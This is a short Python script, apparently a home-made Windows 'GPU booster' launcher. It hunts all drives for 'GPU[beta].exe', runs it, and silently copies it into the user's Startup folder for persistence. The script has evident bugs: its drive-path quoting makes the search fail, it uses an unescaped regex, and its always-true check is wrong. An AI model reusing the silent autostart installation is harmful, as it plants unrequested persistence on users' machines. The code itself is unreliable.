import os , re, ctypes , threading , subprocess 
#MessageBox = ctypes.windll.user32.MessageBoxA

def find_where_iam(Filename):
    for i in range(65,91):
        path = '"' + chr(i) + ':' + "\\" + "\\"
        try:
            os.chdir(path)
        except:
            continue
        for root, dirs, files in os.walk(".", topdown=False):
            for name in files:
                if name == Filename:
                    return os.path.abspath(os.path.join(root, name))

full_path = find_where_iam("GPU[beta].exe")

def got_path():
    res = full_path
    oper = list(res.split('\\'))
    path = ""
    for i in range(len(oper) - 1):
        path += oper[i] + "\\"
    return path 

general_path = got_path()

def run_project():
    os.chdir(general_path)
    subprocess.Popen([r"GPU[beta].exe"])



def process_check():
    operationPath = general_path + "operation\dll\8b12c5fec7e8912da325ee73b380e652" 
    os.chdir(operationPath)
    os.system("tasklist >> cheack_task.ini")
    fname = operationPath + "\cheack_task.ini"
    fhand = open(fname)
    lines = fhand.readlines()
    for line in lines:
        if re.search("GPU[beta].exe", line):
            return 0
    run_project()
    process_check()  # infinite loop will happen if not found the program in check_task.ini

def got_username():
    operationPath = general_path + "operation\dll\8b12c5fec7e8912da325ee73b380e652\\"
    os.chdir(operationPath)
    os.system("set >> set.ini")
    fname = operationPath + "set.ini"
    fhand = open(fname)
    for line in fhand:
        if re.search("APPDATA", line):
            gotname = line
            break

    name = list()
    for i in range(17, len(gotname)):
        if gotname[i] == "\\":
            break
        name.append(gotname[i])
    lastname = ""
    username = lastname.join(name)
    return username

username = got_username()

def copy_to_startup():
    os.chdir(general_path)
    copy_startup = '"' + "C:\Users\\" + username + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" + '"'
    copy = "copy GPU[beta].exe " + copy_startup
    os.system(copy)

def check_startup():
    startup = "C:\Users\\" + username + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    os.chdir(startup)
    os.system("dir >> current.ini")
    copy ='copy current.ini ' '"' + general_path + 'operation\dll\8b12c5fec7e8912da325ee73b380e652\\' + '"'
    os.system(copy)
    os.system('del current.ini')
    f = general_path + "operation\dll\8b12c5fec7e8912da325ee73b380e652\current.ini"
    of = open(f)
    lines = of.readlines()
    for line in lines:
        if re.search("GPU[beta].exe",line) != "None":
            return 0
        else:
            copy_to_startup()
            check_startup()

def performance():
    os.system("powercfg.exe /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c")
    os.chdir("C:\Windows\System32")
    os.system("SystemPropertiesPerformance.exe")

def clean():
    path = general_path + "operation\dll\8b12c5fec7e8912da325ee73b380e652"
    os.chdir(path)
    os.system("del *")

run = threading.Thread(target=run_project)
run.start()
#process_check()
copy_to_startup()
check_startup()
performance()
